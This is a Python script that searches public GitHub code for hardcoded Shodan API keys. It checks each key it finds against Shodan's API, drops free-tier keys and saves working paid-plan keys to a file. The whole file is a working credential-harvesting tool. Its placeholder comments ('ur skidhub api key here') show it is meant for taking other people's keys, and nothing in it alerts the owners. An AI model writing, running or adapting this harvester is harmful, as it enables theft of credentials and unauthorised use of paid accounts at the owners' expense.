import sys      
                                                                                                                                
from shodan import Shodan          
from github import Github                
                                          
                                          
def remove_duplicates(shodan_path):
    print('Removing duplicates...')      
                                          
    lines = []                            
    with open(shodan_path, 'r+') as f:  
        lines = f.readlines()            
        s = set(lines)                                                              
        lines = list(s)                                                            
                                          
    with open(shodan_path, 'w') as f:    
        for line in lines:        
            f.write(line)        

                                                                                    
def test_key(key):                                                                  
    try:                                  
        shodan_api = Shodan(key)          
        info = shodan_api.info()  
                                          
        if info['plan'] == 'dev' :        
            print("\n - Dev key found, skipping...\n")                              
        elif info['plan'] == 'basic':
            print("\n - Basic key found, skipping...\n")                            
        elif info['plan'] == 'oss':
            print("\n - OSS key found, skipping...\n")                              
        else:                            
            with open(shodan_path, 'a+') as f:
                f.write(key + "\n")
                print("\n + Key Found: " + key)
    except:                              
        pass                              


key = 'ur skidhub api key here'                        
shodan_path = 'path to save shit in'

print('Initializing Github API...')
api = Github(key)                        

print('Searching repos...')
repos = api.search_code('language:python shodan_api_key=')

try:                                      
    for repo in repos:
        repo_name = repo.repository.full_name
        print('Checking ' + repo_name)

        bytes_content = repo.decoded_content
        content = str(bytes_content, 'utf-8')
                                            
        lines = content.split("\n")

        key = ''                          
        for line in lines:
            original = line

            line = line.strip()
            line = line.lower()
            line = line.replace(' ', '')

            if 'shodan_api_key="' in line:
                split = original.split('"')
                key = split[1]

                if len(key) == 32:
                    test_key(key)

            elif "shodan_api_key='" in line:
                split = original.split("'")
                key = split[1]

                if len(key) == 32:
                    test_key(key)

except:                                  
    remove_duplicates(shodan_path)
else:                                    
    remove_duplicates(shodan_path)
